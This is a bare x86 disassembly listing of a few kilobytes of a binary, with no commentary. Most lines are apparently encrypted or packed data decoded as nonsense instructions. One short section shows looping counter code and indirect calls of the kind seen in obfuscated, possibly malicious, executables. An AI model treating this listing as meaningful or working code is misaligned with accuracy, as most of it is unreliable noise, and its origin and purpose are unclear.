  413ff1:	xchg   ebx,eax
  413ff2:	lds    ecx,FWORD PTR [edx+0x6d9e683e]
  413ff8:	push   ebx
  413ff9:	in     al,0x29
  413ffb:	xchg   edx,eax
  413ffc:	rcr    ebx,cl
  413ffe:	fadd   QWORD PTR [edi+ecx*2-0x78dbdce2]
  414005:	scas   eax,DWORD PTR es:[edi]
  414006:	cli    
  414007:	es icebp 
  414009:	ror    DWORD PTR ds:0x3fa9e3f6,1
  41400f:	inc    esp
  414010:	fist   WORD PTR ds:0x2344e1ea
  414016:	ins    BYTE PTR es:[edi],dx
  414017:	mov    bl,0x7f
  414019:	cli    
  41401a:	add    DWORD PTR [esi+0x40d3d942],edx
  414020:	rol    DWORD PTR [esi+esi*8-0x323e0f46],cl
  414027:	and    al,0xed
  414029:	push   esp
  41402a:	push   edx
  41402b:	repnz lods al,BYTE PTR ds:[esi]
  41402d:	lods   eax,DWORD PTR ds:[esi]
  41402e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41402f:	mov    ecx,edi
  414031:	push   DWORD PTR [ebp+eax*8+0x2b4275b4]
  414038:	and    al,0xd2
  41403a:	ret    0xa8c
  41403d:	xchg   ecx,eax
  41403e:	popf   
  41403f:	sahf   
  414040:	gs jl  0x41409e
  414043:	imul   ecx,edi,0xfffffff6
  414046:	std    
  414047:	xor    BYTE PTR [ebp*1+0x37dede95],0xec
  41404f:	jmp    0x79b0984d
  414054:	cwde   
  414055:	stos   BYTE PTR es:[edi],al
  414056:	js     0x414056
  414058:	push   0xbb5b1f7f
  41405d:	in     al,0x46
  41405f:	jge    0x414091
  414061:	or     DWORD PTR [edi+0x37],esp
  414064:	aaa    
  414065:	pop    esi
  414066:	lds    esp,FWORD PTR [eax-0x5]
  414069:	ret    
  41406a:	dec    esp
  41406b:	mov    al,dl
  41406d:	test   eax,0xdfed6705
  414072:	outs   dx,DWORD PTR ds:[esi]
  414073:	push   esp
  414074:	ins    DWORD PTR es:[edi],dx
  414075:	jo     0x414087
  414077:	jns    0x4140e8
  414079:	daa    
  41407a:	popa   
  41407b:	repnz or eax,0x96de4d82
  414081:	mov    ecx,0x393c3757
  414086:	aam    0x7f
  414088:	and    ah,0xdb
  41408b:	mov    DWORD PTR ds:0x554cdae0,esp
  414091:	pusha  
  414092:	test   al,0x9e
  414094:	das    
  414095:	adc    DWORD PTR [ebx-0x662f807e],ebx
  41409b:	push   ecx
  41409c:	mov    ch,0x62
  41409e:	and    al,0x21
  4140a0:	jmp    FWORD PTR ds:0x8b48f41c
  4140a6:	out    dx,al
  4140a7:	add    DWORD PTR cs:[ebp+eiz*1+0x59],edi
  4140ac:	loope  0x414061
  4140ae:	jle    0x41404e
  4140b0:	sbb    BYTE PTR [ecx-0x24],0x6c
  4140b4:	pop    DWORD PTR [edx]
  4140b6:	mov    cl,0xf1
  4140b8:	xchg   edi,eax
  4140b9:	lahf   
  4140ba:	adc    al,0xc5
  4140bc:	or     esi,DWORD PTR [esi+0x7c]
  4140bf:	fsub   DWORD PTR [esi-0x40]
  4140c2:	adc    al,0xec
  4140c4:	add    eax,0x10604330
  4140c9:	mov    esp,esi
  4140cb:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4140cd:	lds    eax,FWORD PTR [eax]
  4140cf:	push   ss
  4140d0:	clc    
  4140d1:	stos   BYTE PTR es:[edi],al
  4140d2:	sbb    ah,BYTE PTR [esi+0x72eac362]
  4140d8:	add    DWORD PTR [eax],ebx
  4140da:	adc    dl,BYTE PTR [eax+0x14b5cde9]
  4140e0:	xchg   esi,edx
  4140e2:	cmp    bh,BYTE PTR [ecx]
  4140e4:	out    0x95,eax
  4140e6:	add    eax,0x2e770f71
  4140eb:	sbb    al,0x41
  4140ed:	dec    ebp
  4140ee:	iret   
  4140ef:	inc    ebp
  4140f0:	mov    DWORD PTR [eax],0x2a1feced
  4140f6:	mov    cl,0x90
  4140f8:	call   0x5a1f541c
  4140fd:	rcl    BYTE PTR [ecx-0x2b],0xd9
  414101:	adc    DWORD PTR [ebx+ebx*2-0x80],esi
  414105:	ret    0xe1c7
  414108:	push   esi
  414109:	add    bl,BYTE PTR [esi]
  41410b:	adc    dl,bh
  41410d:	pop    eax
  41410e:	gs fcmovnbe st,st(5)
  414111:	shl    bh,cl
  414113:	add    edi,DWORD PTR [ebp-0x11c56d58]
  414119:	push   0x8c08466b
  41411e:	lds    edx,FWORD PTR [eax]
  414120:	mov    cs,WORD PTR [esi-0x70d50c0b]
  414126:	dec    edx
  414127:	inc    BYTE PTR ds:0x98aacced
  41412d:	jno    0x414120
  41412f:	lods   al,BYTE PTR ds:[esi]
  414130:	stos   BYTE PTR es:[edi],al
  414131:	outs   dx,BYTE PTR ds:[esi]
  414132:	adc    DWORD PTR [ecx-0x2aa65d4b],esi
  414138:	adc    al,al
  41413a:	aad    0x60
  41413c:	xor    eax,DWORD PTR [eax+edx*2]
  41413f:	cmc    
  414140:	aas    
  414141:	ja     0x4140c7
  414143:	hlt    
  414144:	retf   
  414145:	sub    eax,0x92486018
  41414a:	fcomp  DWORD PTR [edi]
  41414c:	in     al,dx
  41414d:	or     al,0x99
  41414f:	imul   ecx,DWORD PTR [esi],0xfffffff0
  414152:	(bad)  
  414153:	aam    0x5c
  414155:	repz inc edi
  414157:	cmp    DWORD PTR [ecx-0x70cad062],0x40
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fdd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fdd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fdd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fdd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e66f
  41418b:	cmp    DWORD PTR ds:0x42fdd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fdd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e7ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fde9
  4141ba:	sbb    DWORD PTR ds:0x42fdd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fe05,0x42e813
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e7eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fe05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e80f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fddd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fddd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fddd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fddd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e673
  41423b:	cmp    DWORD PTR ds:0x42fddd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fddd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fddd,ecx
  414257:	cmp    DWORD PTR ds:0x42fddd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142de
  414283:	mov    al,0xa8
  414285:	cmp    BYTE PTR [eax-0x468f8f8d],al
  41428b:	jle    0x4142fd
  41428d:	jo     0x41422c
  41428f:	push   ecx
  414290:	ss orps xmm0,xmm6
  414294:	outs   dx,DWORD PTR ds:[esi]
  414295:	push   edi
  414296:	sbb    ecx,eax
  414298:	div    BYTE PTR [edi]
  41429a:	push   cs
  41429b:	nop
  41429c:	arpl   WORD PTR [edx-0x34],dx
  41429f:	(bad)  
  4142a0:	and    DWORD PTR [ebx],ebx
  4142a2:	or     BYTE PTR [edx+0x4f946414],ch
  4142a8:	inc    esi
  4142a9:	sti    
  4142aa:	fcos   
  4142ac:	aad    0xd
  4142ae:	or     DWORD PTR [esi*8-0x3fbc23ce],edx
  4142b5:	daa    
  4142b6:	dec    esi
  4142b7:	add    eax,0x8b9a3286
  4142bc:	sbb    eax,0xa6b43ffe
  4142c1:	scas   eax,DWORD PTR es:[edi]
  4142c2:	imul   eax,DWORD PTR [edi-0x33],0xffffffca
  4142c6:	dec    esp
  4142c7:	repz retf 
  4142c9:	fstp   DWORD PTR [edi+0x3d]
  4142cc:	inc    esp
  4142cd:	or     BYTE PTR [edi+0x3d3f4ca6],bl
  4142d3:	sub    eax,0xa4463e1
  4142d8:	and    eax,0xffffffdb
  4142db:	pop    ecx
  4142dc:	or     ah,BYTE PTR [ecx]
  4142de:	or     DWORD PTR [ebx-0x4dc5bd92],ecx
  4142e4:	adc    al,0x1e
  4142e6:	je     0x414314
  4142e8:	cmp    eax,0x60f8746d
  4142ed:	cmp    DWORD PTR ds:0x82835a64,esp
  4142f3:	cmc    
  4142f4:	adc    esi,edx
  4142f6:	scas   al,BYTE PTR es:[edi]
  4142f7:	mov    ds:0x4e7894cf,eax
  4142fc:	ds cdq 
  4142fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ff:	add    ah,BYTE PTR [edx+ecx*4+0x31027486]
  414306:	bound  esi,QWORD PTR [esi-0x1c]
  414309:	pop    ebx
  41430a:	sub    DWORD PTR [ebx],ebp
  41430c:	or     DWORD PTR [ecx-0x1b122d9c],ebx
  414312:	je     0x414357
  414314:	int    0x48
  414316:	sub    eax,0x1c1c760a
  41431b:	mov    al,ds:0xeb35da5e
  414320:	popf   
  414321:	fisubr DWORD PTR [ecx+0x596c3d77]
  414327:	sahf   
  414328:	addps  xmm2,XMMWORD PTR [esi]
  41432b:	xlat   BYTE PTR ds:[ebx]
  41432c:	xchg   esi,eax
  41432d:	sub    al,bh
  41432f:	(bad)  
  414330:	idiv   ecx
  414332:	or     eax,0xf7b01b49
  414337:	mov    BYTE PTR [edx+0x740fce6a],dh
  41433d:	and    esp,DWORD PTR [edx+0x3b]
  414340:	inc    ecx
  414341:	xchg   ebx,eax
  414342:	arpl   WORD PTR [edx+0x64c0f105],di
  414348:	jmp    0x60becb86
  41434d:	mov    ch,0xf
  41434f:	add    eax,0xd2845ab7
  414354:	out    dx,al
  414355:	cmp    edx,DWORD PTR [ebx]
  414357:	gs cmp al,0x3
  41435a:	bound  edi,QWORD PTR [esi]
  41435c:	scas   al,BYTE PTR es:[edi]
  41435d:	mov    dh,0x8e
  41435f:	cwde   
  414360:	push   edx
  414361:	push   eax
  414362:	add    DWORD PTR [ebp-0x36a3ab],0xb61a5399
  41436c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41436d:	xor    al,0x41
  41436f:	mov    WORD PTR [edx],fs
  414371:	cmp    BYTE PTR [ebx-0x5b77af08],bh
  414377:	fdiv   QWORD PTR [eax+0x47]
  41437a:	ja     0x4143d5
  41437c:	mov    ebp,0xb6e17cad
  414381:	mul    BYTE PTR [edx+esi*8+0x21]
  414385:	adc    dl,bh
  414387:	inc    esp
  414388:	es xor eax,0x1e265013
  41438e:	mov    ah,0xc2
  414390:	es sti 
  414392:	mov    esp,DWORD PTR [edi-0x7c017319]
  414398:	hlt    
  414399:	push   edi
  41439a:	jp     0x4143ff
  41439c:	xchg   edi,eax
  41439e:	aaa    
  41439f:	xchg   edi,eax
  4143a0:	push   edi
  4143a1:	loop   0x414418
  4143a3:	xchg   ebx,eax
  4143a4:	mov    edx,0xc3ad4c6f
  4143a9:	xchg   edi,eax
  4143aa:	sbb    bh,dl
  4143ac:	imul   ebx,DWORD PTR [ebx],0x1abe39d2
  4143b2:	pop    ds
  4143b3:	jle    0x414344
  4143b5:	pop    es
  4143b6:	xchg   edx,eax
  4143b7:	jns    0x414342
  4143b9:	fwait
  4143ba:	dec    esp
  4143bb:	mov    bl,bl
  4143bd:	(bad)
  4143c0:	das    
  4143c1:	cmp    bl,BYTE PTR ds:0xe4f0921e
  4143c7:	xchg   esi,eax
  4143c8:	jae    0x4143b1
  4143ca:	scas   al,BYTE PTR es:[edi]
  4143cb:	xor    esp,DWORD PTR [ebx+0x2]
  4143ce:	mov    dl,BYTE PTR [ebp-0x8]
  4143d1:	push   esp
  4143d2:	dec    edx
  4143d3:	js     0x414367
  4143d5:	stos   BYTE PTR es:[edi],al
  4143d6:	mov    BYTE PTR [esi],0xf6
  4143d9:	or     al,0xd1
  4143db:	ja     0x41441d
  4143dd:	retf   0xb392
  4143e0:	fld    DWORD PTR [esi+esi*4]
  4143e3:	adc    al,0x6e
  4143e5:	out    0x22,eax
  4143e7:	lods   eax,DWORD PTR ds:[esi]
  4143e8:	dec    DWORD PTR [ebx]
  4143ea:	dec    edi
  4143eb:	xor    dl,BYTE PTR [ecx+0x2a]
  4143ee:	fwait
  4143ef:	loopne 0x41446b
  4143f1:	(bad)  
  4143f2:	mov    edi,0xf13969ed
  4143f7:	cmp    eax,ebx
  4143f9:	ds std 
  4143fb:	ficomp WORD PTR [eax-0x394389df]
  414401:	ret    0xca39
  414404:	pop    ss
  414405:	loop   0x414426
  414407:	push   esp
  414408:	pop    eax
  414409:	pop    esi
  41440a:	ja     0x4143de
  41440c:	imul   ebx,DWORD PTR [eax+eax*8+0x3c],0x886aa058
  414414:	push   0xffffff9e
  414416:	std    
  414417:	outs   dx,BYTE PTR ds:[esi]
  414418:	adc    DWORD PTR [ebx+0x3],esi
  41441b:	mov    cl,0x34
  41441d:	fsubr  QWORD PTR [ecx+0x69]
  414420:	fidivr WORD PTR [eax+esi*2]
  414423:	int3   
  414424:	push   edx
  414425:	call   0x868ebfcd
  41442a:	cld    
  41442b:	xchg   DWORD PTR [ecx+0x5e05b7c1],ecx
  414431:	ins    DWORD PTR es:[edi],dx
  414432:	cmp    BYTE PTR [edi],dh
  414434:	cmp    al,0xef
  414436:	pop    ecx
  414437:	sbb    edx,DWORD PTR [ebx-0x4ef8104]
  41443d:	cmp    al,0xbb
  41443f:	lods   al,BYTE PTR ds:[esi]
  414440:	dec    esp
  414441:	inc    edx
  414442:	ret    0x70db
  414445:	mov    ah,0x4a
  414447:	inc    ebp
  414448:	and    ecx,DWORD PTR [ebx]
  41444a:	cmp    cl,al
  41444c:	jnp    0x41440e
  41444e:	sbb    DWORD PTR [esi-0x26e366f5],edi
  414454:	cdq    
  414455:	mov    ds:0x652ae93d,al
  41445a:	or     ecx,edx
  41445c:	aam    0xc3
  41445e:	inc    esi
  41445f:	push   eax
  414460:	jg     0x4143fe
  414462:	sbb    ebx,ecx
  414464:	xor    al,0x44
  414466:	xchg   edx,eax
  414467:	or     DWORD PTR [eax],esp
  414469:	and    eax,0x169dfa75
  41446e:	pop    edx
  41446f:	xchg   ebp,eax
  414470:	mov    ds:0x28d63dc0,eax
  414475:	jge    0x4144d1
  414477:	sahf   
  414478:	sbb    bh,al
  41447a:	mov    eax,DWORD PTR [ecx-0x75a947ca]
  414480:	sbb    WORD PTR [edi+0x50],bx
  414484:	loope  0x41442b
  414486:	sahf   
  414487:	xchg   ecx,eax
  414488:	xor    eax,0x261ad542
  41448d:	xchg   ecx,eax
  41448e:	stc    
  41448f:	popf   
  414490:	or     al,BYTE PTR [edi]
  414492:	fidivr DWORD PTR [edx+edi*2]
  414495:	jns    0x41446a
  414497:	clc    
  414498:	mov    ?,WORD PTR [ecx-0x31bd12b]
  41449e:	xor    cl,bl
  4144a0:	cmp    BYTE PTR [edi-0x4c605903],bl
  4144a6:	loopne 0x414518
  4144a8:	jp     0x4144ff
  4144aa:	ja     0x4144ad
  4144ac:	mov    edx,0x8e8cc5ec
  4144b1:	arpl   sp,bx
  4144b3:	inc    ebp
  4144b4:	ja     0x414499
  4144b6:	cwde   
  4144b7:	jb     0x41450a
  4144b9:	mov    bl,BYTE PTR [edx]
  4144bb:	ds mov esi,0xbc598d22
  4144c1:	and    al,0x82
  4144c3:	call   0x4358:0xf7429c5c
  4144ca:	sub    BYTE PTR [ebp-0x5b],ah
  4144cd:	dec    ebp
  4144ce:	ja     0x41446c
  4144d0:	(bad)  
  4144d1:	dec    edi
  4144d2:	lods   eax,DWORD PTR ds:[esi]
  4144d3:	fist   WORD PTR [esi+0x12]
  4144d6:	pushf  
  4144d7:	mov    al,0x9b
  4144d9:	fiadd  DWORD PTR ds:0x3ebb8314
  4144df:	imul   eax,DWORD PTR [ecx+0x6a],0xd37c0b3e
  4144e6:	out    dx,al
  4144e7:	fwait
  4144e8:	add    dl,BYTE PTR [edx+0x35]
  4144eb:	ins    BYTE PTR es:[edi],dx
  4144ec:	jmp    0x414498
  4144ee:	lahf   
  4144ef:	pop    ds
  4144f0:	add    al,0xb0
  4144f2:	sub    ebx,esi
  4144f4:	jo     0x414514
  4144f6:	dec    eax
  4144f7:	out    0xad,al
  4144f9:	repz and esp,DWORD PTR [edx+edx*2+0x65aa40de]
  414501:	mov    ds:0x84fb03dd,eax
  414506:	(bad)  
  414507:	loop   0x414535
  414509:	push   esp
  41450a:	retf   
  41450b:	lock xor DWORD PTR [esi+esi*1-0x39],0x24a3554
  414514:	stc    
  414515:	jp     0x41455e
  414517:	stos   BYTE PTR es:[edi],al
  414518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414519:	das    
  41451a:	cmp    eax,0x5c390728
  41451f:	dec    ebp
  414520:	jmp    0x41456c
  414522:	sub    DWORD PTR [bx+si],esp
  414525:	pusha  
  414526:	mov    esp,esi
  414528:	ret    
  414529:	cdq    
  41452a:	retf   0x89a0
  41452d:	clc    
  41452e:	or     BYTE PTR [edi-0x6a],0xa1
  414532:	sbb    BYTE PTR [ecx],bl
  414534:	jno    0x414571
  414536:	mov    eax,0xd5c769c0
  41453b:	stos   BYTE PTR es:[edi],al
  41453c:	imul   edi,DWORD PTR [eax-0x4e],0x737b3124
  414543:	xchg   edi,eax
  414544:	sahf   
  414545:	mov    ebp,0xbe2e6bbd
  41454a:	or     BYTE PTR [esi+0x39b96b70],0xd
  414551:	imul   ecx,DWORD PTR [edx+0x75ffcaea],0xc75ffd0
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x21dfbeb4
  414576:	push   ds
  414577:	and    al,0xc9
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414522
  414581:	mov    al,ds:0x94d4afdb
  414586:	pop    es
  414587:	mov    ds:0x66dd360d,eax
  41458c:	mov    edx,0x8227d35c
  414591:	push   esi
  414592:	fadd   st,st(3)
  414594:	fiadd  WORD PTR [ecx+0x48]
  414597:	ds mov bl,dl
  41459a:	out    0x28,al
  41459c:	out    dx,eax
  41459d:	mov    ds:0xe6e55e9b,eax
  4145a2:	mov    ebp,DWORD PTR [esi-0x5a]
  4145a5:	jno    0x41454d
  4145a7:	mov    ebp,0xa08da759
  4145ac:	dec    ebx
  4145ad:	outs   dx,DWORD PTR ds:[esi]
  4145ae:	xlat   BYTE PTR ds:[ebx]
  4145af:	ja     0x4145ce
  4145b1:	popf   
  4145b2:	cwde   
  4145b3:	jp     0x414630
  4145b5:	loop   0x4145ff
  4145b7:	mov    cl,0x3d
  4145b9:	ins    DWORD PTR es:[edi],dx
  4145ba:	clc    
  4145bb:	enter  0xf8a1,0x90
  4145bf:	shl    ebx,1
  4145c1:	outs   dx,DWORD PTR ds:[esi]
  4145c2:	shr    edi,cl
  4145c4:	push   eax
  4145c5:	enter  0x6cb7,0xfc
  4145c9:	mov    al,0x7b
  4145cb:	ret    
  4145cc:	push   ecx
  4145cd:	mov    esp,esp
  4145cf:	sub    eax,DWORD PTR ds:0xb0f3e3b4
  4145d5:	mov    al,ds:0x1db1ca3e
  4145da:	pop    ebp
  4145db:	test   eax,0xdb38a4fb
  4145e0:	cmp    al,0x16
  4145e2:	in     al,dx
  4145e3:	sub    eax,0xabe80b13
  4145e8:	hlt    
  4145e9:	inc    ecx
  4145ea:	add    ah,BYTE PTR [ebx-0x28f9fa51]
  4145f0:	dec    esi
  4145f1:	sbb    DWORD PTR [esi+eiz*8-0x6a5d7c30],ebx
  4145f8:	pop    esi
  4145f9:	and    al,0xdf
  4145fb:	mov    al,0xf9
  4145fd:	pop    ebp
  4145fe:	jnp    0x4145bf
  414600:	(bad)  
  414601:	addr16 daa 
  414603:	push   ebp
  414604:	aad    0x60
  414606:	test   edx,ebx
  414608:	mov    bh,0x9a
  41460a:	inc    ebp
  41460b:	dec    ecx
  41460c:	ss stos BYTE PTR es:[edi],al
  41460e:	mov    dl,0x41
  414610:	sbb    BYTE PTR [eax+0x1],dl
  414613:	clc    
  414614:	jmp    0xdb32:0xfef21a15
  41461b:	sbb    BYTE PTR [edi+eax*2-0x21a9c5a4],bl
  414622:	test   al,0x7
  414624:	add    al,0x6
  414626:	je     0x414661
  414628:	mov    edx,0xdb924168
  41462d:	jae    0x414617
  41462f:	xchg   ebp,eax
  414630:	add    DWORD PTR [edi],0xfffffffb
  414633:	xchg   esi,eax
  414634:	outs   dx,DWORD PTR ds:[esi]
  414635:	mov    ecx,0x1fa8b22f
  41463a:	mov    bh,0xb7
  41463c:	adc    ebx,ebp
  41463e:	(bad)  
  41463f:	pop    esp
  414640:	stc    
  414641:	pop    ds
  414642:	mov    ah,0xa5
  414644:	mov    ch,0x70
  414646:	dec    eax
  414647:	pop    eax
  414648:	pop    ecx
  414649:	push   ss
  41464a:	dec    edi
  41464b:	pop    ds
  41464c:	sbb    al,0xcb
  41464e:	cmc    
  41464f:	inc    edi
  414650:	add    BYTE PTR [edx],bl
  414652:	inc    edx
  414653:	stc    
  414654:	pusha  
  414655:	inc    eax
  414656:	daa    
  414657:	add    al,0xfc
  414659:	sub    ebp,DWORD PTR [esi-0x7d8feb4a]
  41465f:	inc    eax
  414660:	dec    esi
  414661:	loop   0x4145f0
  414663:	icebp  
  414664:	or     DWORD PTR [ecx+0x2d1f1670],ebx
  41466a:	adc    DWORD PTR [edi-0x6c3f4dfe],edx
  414670:	cmp    al,0xb
  414672:	iret   
  414673:	mov    BYTE PTR [eax+esi*8+0x69],cl
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cwde   
  414679:	bound  ecx,QWORD PTR [ebp+edi*4-0x163d819d]
  414680:	icebp  
  414681:	xor    BYTE PTR [esp+edi*2],dh
  414684:	pop    es
  414685:	cld    
  414686:	push   edi
  414687:	mov    eax,ecx
  414689:	mov    DWORD PTR ds:0x39019d90,edi
  41468f:	(bad)  
  414691:	push   ebx
  414692:	mov    WORD PTR [ebx+0xc203b49],ss
  414698:	test   eax,0xe661b192
  41469d:	iret   
  41469e:	outs   dx,BYTE PTR ds:[esi]
  41469f:	bound  esp,QWORD PTR ds:0xdde1c3e5
  4146a5:	inc    ebx
  4146a6:	sub    eax,0x7a0625d7
  4146ab:	(bad)  [edx]
  4146ad:	push   ss
  4146ae:	push   edi
  4146af:	es xchg ecx,eax
  4146b1:	adc    DWORD PTR [esi+0x6ae0caf7],ecx
  4146b7:	test   eax,0x34047cb5
  4146bc:	add    al,0x71
  4146be:	inc    edx
  4146bf:	push   es
  4146c0:	aam    0xeb
  4146c2:	pop    es
  4146c3:	stos   BYTE PTR es:[edi],al
  4146c4:	mov    dh,0x32
  4146c6:	or     eax,0x70eb1fe7
  4146cb:	jp     0x414677
  4146cd:	xchg   WORD PTR [edi-0x1cf67f4e],bx
  4146d4:	xor    ah,dl
  4146d6:	leave  
  4146d7:	mov    al,0x56
  4146d9:	cld    
  4146da:	sbb    eax,0x51beb4
  4146df:	fadd   DWORD PTR [ebx]
  4146e1:	out    dx,eax
  4146e2:	cmp    dl,BYTE PTR [ebx+0x6c474ae9]
  4146e8:	xchg   BYTE PTR [edi-0x18ac6890],dl
  4146ee:	(bad)  
  4146f0:	dec    ebp
  4146f1:	cmp    al,0xe1
  4146f3:	fidivr DWORD PTR [eax+eax*8]
  4146f6:	nop
  4146f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f8:	fndisi(8087 only) 
  4146fa:	cmp    eax,edi
  4146fc:	(bad)  
  4146fd:	mov    WORD PTR [ebp+ebp*8-0x338b45d4],cs
  414704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414705:	jae    0x41477b
  414707:	iret   
  414708:	and    ecx,DWORD PTR [eax+0x74]
  41470b:	mov    bl,BYTE PTR [edx]
  41470d:	mov    bh,0x95
  41470f:	sub    DWORD PTR [edx],edx
  414711:	push   edi
  414712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414713:	and    eax,0x1fab0d5
  414718:	popa   
  414719:	jp     0x41469c
  41471b:	jno    0x414741
  41471d:	push   esp
  41471e:	xchg   edi,eax
  41471f:	jnp    0x4146b6
  414721:	aaa    
  414722:	loop   0x4146c5
  414724:	and    dl,bl
  414726:	aas    
  414727:	pushf  
  414728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414729:	sbb    edi,DWORD PTR ds:0x56fc0246
  41472f:	and    ch,BYTE PTR [ebx+0x2a597473]
  414735:	sti    
  414736:	xchg   edx,eax
  414737:	lahf   
  414738:	ja     0x41476b
  41473a:	sub    eax,0x7ba60fc1
  41473f:	dec    ebp
  414740:	dec    ebx
  414741:	(bad)  
  414742:	jge    0x414776
  414744:	imul   edi,DWORD PTR [edx],0xffffffe4
  414747:	daa    
  414748:	in     eax,dx
  414749:	sbb    DWORD PTR [ecx],ebx
  41474b:	dec    edi
  41474c:	gs add al,0xb9
  41474f:	push   esi
  414750:	cmp    BYTE PTR [ebx+0x77],bl
  414753:	pop    es
  414754:	mov    esp,0xb032376c
  414759:	adc    eax,0xaaf383fb
  41475e:	sar    DWORD PTR [ebp-0x14],cl
  414761:	mov    edi,0x8a57442f
  414766:	es ins DWORD PTR es:[edi],dx
  414768:	sub    eax,0xe2b1e05d
  41476d:	mov    al,ds:0xef6dc1d0
  414772:	aam    0x3a
  414774:	pusha  
  414775:	lock inc edx
  414777:	jle    0x4147e2
  414779:	push   ds
  41477a:	cli    
  41477b:	mov    esp,0xc1e53207
  414780:	pop    esi
  414781:	popf   
  414782:	fld    st(3)
  414784:	aas    
  414785:	push   edx
  414786:	pusha  
  414787:	nop
  414788:	jl     0x414720
  41478a:	jbe    0x41479b
  41478c:	push   esp
  41478d:	dec    edi
  41478e:	jo     0x414762
  414790:	and    BYTE PTR [edi+ebx*2+0x71],bl
  414794:	inc    edx
  414795:	mov    ds:0x762b17fc,al
  41479a:	in     al,dx
  41479b:	outs   dx,BYTE PTR ds:[esi]
  41479c:	ret    
  41479d:	out    0xb6,al
  41479f:	xchg   ebp,eax
  4147a0:	retf   
  4147a1:	pop    esi
  4147a2:	and    DWORD PTR [ecx-0x586a587d],esi
  4147a8:	icebp  
  4147a9:	ins    DWORD PTR es:[edi],dx
  4147aa:	xor    dl,ah
  4147ac:	ja     0x4147f6
  4147ae:	das    
  4147af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b0:	js     0x414745
  4147b2:	out    dx,eax
  4147b3:	xor    ah,ah
  4147b5:	shr    ch,cl
  4147b7:	mov    ebp,0x6384f53e
  4147bc:	sub    eax,0x8dbd8f67
  4147c1:	ins    BYTE PTR es:[edi],dx
  4147c2:	inc    esp
  4147c3:	data16 adc BYTE PTR [eax],bl
  4147c6:	and    al,0xe
  4147c8:	(bad)  
  4147c9:	fcmovb st,st(0)
  4147cb:	shl    ebp,0x4b
  4147ce:	dec    ebp
  4147cf:	idiv   BYTE PTR [ecx+ebp*8+0x2ac4f48f]
  4147d6:	adc    al,0xb
  4147d8:	add    eax,0x932cbeff
  4147dd:	daa    
  4147de:	loopne 0x4147ff
  4147e0:	sub    DWORD PTR [esp+eiz*4-0x5c59eae7],edx
  4147e7:	adc    ecx,DWORD PTR [edi+eiz*4-0x79]
  4147eb:	sub    DWORD PTR [ecx],ecx
  4147ed:	nop
  4147ee:	mov    esp,DWORD PTR [ebp+0x0]
  4147f1:	cmp    BYTE PTR [ecx+0x3ae0d8a1],bl
  4147f7:	pop    eax
  4147f8:	in     al,0xd4
  4147fa:	leave  
  4147fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147fc:	test   ebp,ecx
  4147fe:	enter  0xc2ed,0xdb
  414802:	test   BYTE PTR [esi-0x56],cl
  414805:	mov    dl,0xa4
  414807:	dec    eax
